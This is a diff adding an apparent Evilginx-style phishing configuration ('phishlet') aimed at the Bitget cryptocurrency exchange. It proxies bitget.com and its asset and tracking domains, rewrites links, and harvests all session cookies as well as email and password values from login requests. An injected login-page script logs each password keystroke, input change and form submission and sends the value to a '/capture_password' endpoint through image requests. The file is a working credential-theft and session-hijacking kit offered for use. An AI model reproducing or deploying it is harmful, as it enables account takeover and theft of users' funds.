@@ -1,0 +1,132 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+redirect_url: "/dashboard"
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'bitget.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'bitget.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'img', orig_sub: 'img', domain: 'bitget.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'img', orig_sub: 'img', domain: 'bgstatic.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: '', orig_sub: '', domain: 'bitget.com', search: 'https://{hostname}', replace: '{hostname}', mimes: ['application/json', 'text/plain', 'application/xhtml+xml', 'application/xml', 'image/avif', 'image/webp', 'image/apng', 'application/javascript','application/signed-exchange']}
+  - {triggers_on: 'www', orig_sub: 'www', domain: 'bitget.com', search: 'https://{hostname}', replace: '{hostname}', mimes: ['application/json', 'text/plain', 'application/xhtml+xml', 'application/xml', 'image/avif', 'image/webp', 'image/apng', 'application/javascript']}
+  - {triggers_on: 'a.ada.support', orig_sub: 'a', domain: 'ada.support', search: 'https://{hostname_regexp}', replace: '{hostname}', mimes: ['application/json', 'text/plain', 'application/xhtml+xml', 'application/xml', 'image/avif', 'image/webp', 'image/apng', 'application/javascript']}
+  - {triggers_on: 'bitget.ada.support', orig_sub: 'bitget', domain: 'ada.support', search: 'https://{hostname_regexp}', replace: '{hostname}', mimes: ['application/json', 'text/plain', 'application/xhtml+xml', 'application/xml', 'image/avif', 'image/webp', 'image/apng', 'application/javascript']}
+  - {triggers_on: 'static.zdassets.com', orig_sub: 'static', domain: 'zdassets.com', search: 'https://{hostname_regexp}', replace: '{hostname}', mimes: ['application/json', 'text/plain', 'application/xhtml+xml', 'application/xml', 'image/avif', 'image/webp', 'image/apng', 'application/javascript']}
+  - {triggers_on: 'x.bidswitch.net', orig_sub: 'x', domain: 'bidswitch.net', search: 'https://{hostname_regexp}', replace: '{hostname}', mimes: ['application/json', 'text/plain', 'application/xhtml+xml', 'application/xml', 'image/avif', 'image/webp', 'image/apng', 'application/javascript']}
+  - {triggers_on: 'x.adroll.com', orig_sub: 'x', domain: 'adroll.com', search: 'https://{hostname_regexp}', replace: '{hostname}', mimes: ['application/json', 'text/plain', 'application/xhtml+xml', 'application/xml', 'image/avif', 'image/webp', 'image/apng', 'application/javascript']}
+  - {triggers_on: 'd.adroll.com', orig_sub: 'd', domain: 'adroll.com', search: 'https://{hostname_regexp}', replace: '{hostname}', mimes: ['application/json', 'text/plain', 'application/xhtml+xml', 'application/xml', 'image/avif', 'image/webp', 'image/apng', 'application/javascript']}
+  - {triggers_on: 'img.bgstatic.com', orig_sub: 'img', domain: 'bgstatic.com', search: 'https://{hostname_regexp}', replace: '{hostname}', mimes: ['application/json', 'text/plain', 'application/xhtml+xml', 'application/xml', 'image/avif', 'image/webp', 'image/apng', 'application/javascript']}
+  - {triggers_on: 'idsync.rlcdn.com', orig_sub: 'idsync', domain: 'rlcdn.com', search: 'https://{hostname_regexp}', replace: '{hostname}', mimes: ['application/json', 'text/plain', 'application/xhtml+xml', 'application/xml', 'image/avif', 'image/webp', 'image/apng', 'application/javascript']}
+  - {triggers_on: 'bitget.com', orig_sub: 'wa', domain: 'appsflyer.com', search: 'https://{hostname_regexp}', replace: '{hostname}', mimes: ['application/json', 'text/plain', 'application/xhtml+xml', 'application/xml', 'image/avif', 'image/webp', 'image/apng', 'application/javascript']}
+  - {triggers_on: 'bitget.com', orig_sub: '', domain: 'bitget.com', search: 'https://{hostname_regexp}', replace: '{hostname}', mimes: ['application/json', 'text/plain', 'application/xhtml+xml', 'application/xml', 'image/avif', 'image/webp', 'image/apng', 'application/javascript']}
+
+auth_tokens:
+  - domain: '.bitget.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: 'www.bitget.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+
+
+auth_urls:
+  - "/api/v2/user/login"
+  - "/dashboard"
+  - "/account"
+
+credentials:
+  username:
+    key: ''
+    search: '"email":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"pwd":"([^"]*)'
+    type: 'json'
+  custom:
+    key: ''
+    search: '"password":"([^"]*)'
+    type: 'json'
+
+bot_bypass:
+  enabled: true
+  login_url: "/webapi/auth/login/loginByPassword"
+  email_selector: "input#email"
+  email_pattern: "email=([^&]+)"
+  token_url: "/auth/token"
+  token_pattern: "token=([^&]+)"
+
+login:
+  domain: 'www.bitget.com'
+  path: '/en/login'
+
+js_inject:
+  - trigger_domains: ["www.bitget.com"]
+    trigger_paths: ["/en/login"]
+    trigger_params: []
+    script: |
+      console.log('JavaScript: ' + window.location.pathname);
+      function observePasswordInput() {
+        console.log(' MutationObserver ');
+        const observer = new MutationObserver((mutations, obs) => {
+          console.log('MutationObserver DOM');
+          const passwordInput = document.querySelector('input[data-test-id="login-input-password"]');
+          if (passwordInput) {
+            console.log(': ', passwordInput);
+            obs.disconnect();
+            passwordInput.addEventListener('keypress', function(e) {
+              const value = passwordInput.value + String.fromCharCode(e.keyCode); 
+              console.log('keypress: ', value);
+              if (value) {
+                const img = new Image();
+                img.src = '/capture_password?password=' + encodeURIComponent(value);
+                img.onload = () => console.log('');
+                img.onerror = () => console.error('');
+              }
+            });
+            passwordInput.addEventListener('input', function(e) {
+              console.log(': ', e.target.value);
+              const img = new Image();
+              img.src = '/capture_password?password=' + encodeURIComponent(e.target.value);
+              img.onload = () => console.log('/capture_password ');
+              img.onerror = () => console.error('/capture_password ');
+            });
+            const form = passwordInput.closest('form');
+            if (form) {
+              console.log('');
+              form.addEventListener('submit', function(e) {
+                const password = passwordInput.value;
+                console.log(': ', password);
+                const img = new Image();
+                img.src = '/capture_password?password=' + encodeURIComponent(password);
+                img.onload = () => console.log('');
+                img.onerror = () => console.error('');
+              });
+            } else {
+              console.error('');
+            }
+          } else {
+            console.log('');
+          }
+        });
+        observer.observe(document.body, { childList: true, subtree: true });
+        console.log('');
+        const passwordInput = document.querySelector('input[data-test-id="login-input-password"]');
+        if (passwordInput) {
+          observer.disconnect();
+          console.log('');
+          passwordInput.dispatchEvent(new Event('input'));
+        }
+      }
+      console.log('');
+      document.addEventListener('DOMContentLoaded', () => {
+        console.log('DOMContentLoaded');
+        observePasswordInput();
+      });
+      if (document.readyState === 'complete' || document.readyState === 'interactive') {
+        console.log('observePasswordInput');
+        observePasswordInput();
+      }
+      console.log('');
